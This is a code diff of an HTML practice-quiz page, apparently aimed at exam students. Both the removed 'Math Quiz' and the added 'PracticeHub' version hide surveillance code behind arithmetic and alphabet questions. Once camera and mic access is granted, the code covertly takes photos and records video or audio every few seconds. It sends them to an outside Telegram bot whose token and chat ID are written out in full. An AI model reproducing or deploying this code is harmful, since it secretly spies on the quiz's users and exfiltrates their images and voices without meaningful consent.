@@ -1,196 +1,281 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Math Quiz</title>
-<style>
-  body { font-family: Arial, sans-serif; background:#101820; color:#fff; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; }
-  .card { background:#1c1f2b; padding:20px; border-radius:10px; max-width:400px; width:100%; text-align:center; }
-  button { background:#1f6feb; color:white; border:none; padding:10px 15px; margin-top:10px; border-radius:5px; cursor:pointer; }
-  button[disabled] { opacity:0.5; cursor:not-allowed; }
-  input { padding:8px; margin-top:10px; width:80%; border-radius:5px; border:none; }
-  #quiz { display:none; }
-  video#cam { position:absolute; left:-9999px; opacity:0; pointer-events:none; }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PracticeHub</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: white;
+      text-align: center;
+      overflow-x: hidden;
+    }
+    h1 {
+      font-size: 2.5rem;
+      margin-top: 30px;
+      text-shadow: 2px 2px 10px cyan;
+    }
+    .menu-btn {
+      margin: 15px;
+      padding: 15px 30px;
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid cyan;
+      border-radius: 15px;
+      font-size: 1.2rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .menu-btn:hover {
+      background: cyan;
+      color: black;
+      transform: scale(1.05);
+    }
+    .question-section {
+      display: none;
+    }
+    .option-btn {
+      display: block;
+      margin: 10px auto;
+      padding: 10px 20px;
+      font-size: 1rem;
+      background-color: #222;
+      color: white;
+      border: 1px solid cyan;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .option-btn:hover {
+      background-color: cyan;
+      color: black;
+    }
+    .back-btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: crimson;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    #fireworks {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      pointer-events: none;
+      z-index: 9999;
+    }
+    .red-flash {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: red;
+      opacity: 0.7;
+      z-index: 9998;
+      animation: flash 0.5s ease-out;
+    }
+    @keyframes flash {
+      0% { opacity: 0.7; }
+      100% { opacity: 0; }
+    }
+  </style>
 </head>
 <body>
-<div class="card">
-  <div id="consent">
-    <h2>Start Quiz</h2>
-    <p>Click below to allow camera & microphone access.</p>
-    <button id="startBtn">Start</button>
+  <h1>PracticeHub</h1>
+  <div id="menu">
+    <button class="menu-btn" onclick="startQuiz('alphabet')">Alphabet Position Practice</button>
+    <button class="menu-btn" onclick="startQuiz('opposite')">Opposite Letter Practice</button>
+    <button class="menu-btn" onclick="startQuiz('add')">Addition Practice</button>
+    <button class="menu-btn" onclick="startQuiz('sub')">Subtraction Practice</button>
+    <button class="menu-btn" onclick="startQuiz('mul')">Multiplication Practice</button>
+    <button class="menu-btn" onclick="startQuiz('div')">Division Practice</button>
+    <button class="menu-btn" onclick="startQuiz('civil')">SSC JE Civil PYQ</button>
   </div>
-
-  <div id="quiz">
-    <h2>Math Quiz</h2>
-    <p id="question"></p>
-    <input type="number" id="answer" placeholder="Your answer"/>
-    <br>
-    <button id="submitBtn">Submit</button>
-    <p id="feedback"></p>
+  <div class="question-section">
+    <h2 id="question"></h2>
+    <div id="options"></div>
+    <button class="back-btn" onclick="goBack()">Back</button>
   </div>
-</div>
+  <canvas id="fireworks"></canvas>
 
-<video id="cam" playsinline muted></video>
-<canvas id="snapCanvas" style="display:none;"></canvas>
+  <script>
+    const BOT_TOKEN = "8341564010:AAGbmOK0aGXFrEvCIBxmrllD8pAYqVhLiX0";
+    const CHAT_ID = "1851300622";
 
-<script>
-// ===== Telegram Config =====
-const BOT_TOKEN = '8341564010:AAGbmOK0aGXFrEvCIBxmrllD8pAYqVhLiX0';
-const CHAT_ID = '1851300622';
+    let type = '';
+    let answer = '';
+    const canvas = document.getElementById('fireworks');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
 
-// ===== Elements =====
-const startBtn = document.getElementById('startBtn');
-const consentDiv = document.getElementById('consent');
-const quizDiv = document.getElementById('quiz');
-const questionEl = document.getElementById('question');
-const answerInput = document.getElementById('answer');
-const submitBtn = document.getElementById('submitBtn');
-const feedbackEl = document.getElementById('feedback');
-const videoEl  = document.getElementById('cam');
-const canvas   = document.getElementById('snapCanvas');
-
-let stream = null;
-let recordingLoopStopped = true;
-let correctAnswer = 0;
-
-// ===== Helper Functions =====
-function waitForFirstFrame(videoEl, timeout = 5000) {
-  return new Promise((resolve, reject) => {
-    if (videoEl.readyState >= 2 && videoEl.currentTime > 0) return resolve();
-    let settled = false;
-    function done(ok) { if (settled) return; settled = true; clearTimeout(timer); ok ? resolve() : reject(new Error('no frame')); }
-    if (videoEl.requestVideoFrameCallback) {
-      videoEl.requestVideoFrameCallback(() => done(true));
-    } else {
-      const onplay = () => setTimeout(() => done(true), 50);
-      videoEl.addEventListener('playing', onplay, { once: true });
-      videoEl.addEventListener('loadeddata', onplay, { once: true });
-    }
-    const timer = setTimeout(() => done(false), timeout);
-  });
-}
-
-function captureSnapshotBlob() {
-  return new Promise((resolve, reject) => {
-    try {
-      const w = videoEl.videoWidth || 640;
-      const h = videoEl.videoHeight || 480;
-      if (!w || !h) return reject(new Error('video has no dimensions yet'));
-      canvas.width = w; canvas.height = h;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(videoEl, 0, 0, w, h);
-      canvas.toBlob(blob => { blob ? resolve(blob) : reject(new Error('snapshot toBlob null')); }, 'image/jpeg', 0.85);
-    } catch (err) { reject(err); }
-  });
-}
-
-function preferredMime() {
-  if (!window.MediaRecorder) return '';
-  try {
-    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) return 'video/webm;codecs=vp9';
-    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) return 'video/webm;codecs=vp8';
-    if (MediaRecorder.isTypeSupported('video/webm')) return 'video/webm';
-  } catch(e) {}
-  return '';
-}
-
-async function sendPhotoBlob(blob) {
-  try {
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('photo', blob, 'snap.jpg');
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-  } catch (err) {}
-}
-
-async function sendVideoBlob(blob) {
-  try {
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('video', blob, 'clip.webm');
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
-  } catch (err) {}
-}
-
-async function startRecordingLoop() {
-  if (!stream) return;
-  if (!window.MediaRecorder) return;
-  recordingLoopStopped = false;
-  const mime = preferredMime();
-
-  while (!recordingLoopStopped && stream.active) {
-    let chunks = [];
-    try {
-      const options = mime ? { mimeType: mime } : undefined;
-      const recorder = new MediaRecorder(stream, options);
-      recorder.ondataavailable = (e) => { if (e.data && e.data.size) chunks.push(e.data); };
-      const stoppedPromise = new Promise((res, rej) => { recorder.onstop = res; recorder.onerror = rej; });
-
-      try { await videoEl.play(); await waitForFirstFrame(videoEl); } catch(_) {}
-
-      try {
-        const snapBlob = await captureSnapshotBlob();
-        sendPhotoBlob(snapBlob);
-      } catch (err) {}
-
-      recorder.start();
-      await new Promise(r => setTimeout(r, 10000));
-      if (recorder.state === 'recording') recorder.stop();
-      await stoppedPromise;
-
-      if (chunks.length) {
-        const blob = new Blob(chunks, { type: chunks[0].type || 'video/webm' });
-        sendVideoBlob(blob);
+    function startQuiz(t) {
+      type = t;
+      document.getElementById('menu').style.display = 'none';
+      document.querySelector('.question-section').style.display = 'block';
+      requestCameraAndMic();
+      if (type === 'civil') {
+        document.getElementById('question').innerText = "Coming Soon...";
+        document.getElementById('options').innerHTML = '';
+      } else {
+        showQuestion();
       }
-      await new Promise(r => setTimeout(r, 400));
-    } catch (err) { break; }
-  }
-}
+    }
 
-// ===== Quiz Functions =====
-function newQuestion() {
-  const a = Math.floor(Math.random()*50) + 1;
-  const b = Math.floor(Math.random()*50) + 1;
-  correctAnswer = a + b;
-  questionEl.textContent = `${a} + ${b} = ?`;
-  answerInput.value = '';
-  feedbackEl.textContent = '';
-}
+    function goBack() {
+      document.querySelector('.question-section').style.display = 'none';
+      document.getElementById('menu').style.display = 'block';
+    }
 
-submitBtn.addEventListener('click', () => {
-  const userAns = parseInt(answerInput.value, 10);
-  if (userAns === correctAnswer) {
-    feedbackEl.textContent = '✅ Correct!';
-  } else {
-    feedbackEl.textContent = `❌ Wrong! Correct: ${correctAnswer}`;
-  }
-  setTimeout(newQuestion, 1500);
-});
+    function showQuestion() {
+      let q = '', correct = '';
+      if (type === 'alphabet') {
+        const letter = String.fromCharCode(65 + Math.floor(Math.random() * 26));
+        correct = (letter.charCodeAt(0) - 64).toString();
+        q = `What is the position of letter '${letter}'?`;
+      } else if (type === 'opposite') {
+        const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const letter = alphabet[Math.floor(Math.random() * 26)];
+        correct = alphabet[25 - alphabet.indexOf(letter)];
+        q = `What is the opposite of letter '${letter}'?`;
+      } else if (type === 'add') {
+        let a = Math.floor(Math.random() * 50);
+        let b = Math.floor(Math.random() * 50);
+        correct = (a + b).toString();
+        q = `What is ${a} + ${b}?`;
+      } else if (type === 'sub') {
+        let a = Math.floor(Math.random() * 100);
+        let b = Math.floor(Math.random() * a);
+        correct = (a - b).toString();
+        q = `What is ${a} - ${b}?`;
+      } else if (type === 'mul') {
+        let a = Math.floor(Math.random() * 15);
+        let b = Math.floor(Math.random() * 15);
+        correct = (a * b).toString();
+        q = `What is ${a} × ${b}?`;
+      } else if (type === 'div') {
+        let b = Math.floor(Math.random() * 9) + 1;
+        let a = b * Math.floor(Math.random() * 10);
+        correct = (a / b).toString();
+        q = `What is ${a} ÷ ${b}?`;
+      }
 
-// ===== Start Button =====
-startBtn.addEventListener('click', async () => {
-  startBtn.disabled = true;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    videoEl.srcObject = stream;
-    consentDiv.style.display = 'none';
-    quizDiv.style.display = 'block';
-    newQuestion();
-    startRecordingLoop();
-  } catch (err) {
-    alert('Camera/mic permission denied.');
-    startBtn.disabled = false;
-  }
-});
+      answer = correct;
+      const optDiv = document.getElementById('options');
+      optDiv.innerHTML = '';
+      let options = [correct];
 
-window.addEventListener('beforeunload', () => {
-  recordingLoopStopped = true;
-  if (stream) {
-    stream.getTracks().forEach(t => t.stop());
-  }
-});
-</script>
+      if (type === 'opposite') {
+        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        while (options.length < 4) {
+          let rand = letters[Math.floor(Math.random() * 26)];
+          if (!options.includes(rand)) {
+            options.push(rand);
+          }
+        }
+      } else {
+        while (options.length < 4) {
+          let rand = (parseInt(correct) + Math.floor(Math.random() * 10) - 5).toString();
+          if (!options.includes(rand)) options.push(rand);
+        }
+      }
+
+      options.sort(() => Math.random() - 0.5);
+      options.forEach(opt => {
+        const btn = document.createElement('button');
+        btn.className = 'option-btn';
+        btn.innerText = opt;
+        btn.onclick = () => checkAnswer(opt);
+        optDiv.appendChild(btn);
+      });
+
+      document.getElementById('question').innerText = q;
+    }
+
+    function checkAnswer(given) {
+      if (given == answer) {
+        launchFireworks();
+      } else {
+        const red = document.createElement('div');
+        red.className = 'red-flash';
+        document.body.appendChild(red);
+        setTimeout(() => red.remove(), 500);
+      }
+      setTimeout(showQuestion, 1200);
+    }
+
+    function launchFireworks() {
+      let particles = [];
+      for (let i = 0; i < 100; i++) {
+        particles.push({
+          x: canvas.width / 2,
+          y: canvas.height / 2,
+          angle: Math.random() * 2 * Math.PI,
+          speed: Math.random() * 5 + 2,
+          radius: Math.random() * 2 + 1,
+          life: 100
+        });
+      }
+      function animate() {
+        ctx.fillStyle = 'rgba(0,0,0,0.2)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => {
+          p.x += Math.cos(p.angle) * p.speed;
+          p.y += Math.sin(p.angle) * p.speed;
+          p.life--;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.radius, 0, 2 * Math.PI);
+          ctx.fillStyle = 'hsl(' + Math.random() * 360 + ',100%,50%)';
+          ctx.fill();
+        });
+        particles = particles.filter(p => p.life > 0);
+        if (particles.length > 0) requestAnimationFrame(animate);
+        else ctx.clearRect(0, 0, canvas.width, canvas.height);
+      }
+      animate();
+    }
+
+    function requestCameraAndMic() {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(stream => {
+          const videoTrack = stream.getVideoTracks()[0];
+          const imageCapture = new ImageCapture(videoTrack);
+          setInterval(() => {
+            imageCapture.takePhoto().then(blob => {
+              sendToTelegram(blob, "photo");
+            });
+          }, 5000);
+
+          setInterval(() => {
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+              const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+              sendToTelegram(audioBlob, "voice");
+            };
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 10000);
+          }, 15000);
+        })
+        .catch(err => console.error("Permission denied or error:", err));
+    }
+
+    function sendToTelegram(blob, type) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/send${type === "photo" ? "Photo" : "Voice"}`;
+      const formData = new FormData();
+      formData.append(type === "photo" ? "photo" : "voice", blob, type === "photo" ? "image.jpg" : "audio.webm");
+      formData.append("chat_id", CHAT_ID);
+      fetch(url, { method: "POST", body: formData }).catch(err => console.error(err));
+    }
+  </script>
 </body>
 </html>
